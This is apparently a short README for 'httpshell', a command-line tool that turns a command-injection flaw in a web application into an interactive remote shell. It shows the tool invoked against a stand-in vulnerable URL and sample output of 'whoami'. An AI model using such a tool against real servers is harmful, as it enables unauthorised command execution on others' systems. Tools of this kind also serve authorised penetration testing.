# HTTP Shell

A lightweight HTTP CLI Shell that enables custom command injection into vulnerable web applications with a familiar shell-like interface.

## Examples

The `q` query parameter of `http://example.com/vln.php` is vulnerable to command injections, then the following command connects to it and starts a shell-like environment:

```sh
httpshell -a http://example.com/vln.php -p q
```
```txt
Connection successful!

example.com > whoami
www-data
```

Use `httpshell --help` for all flags and options.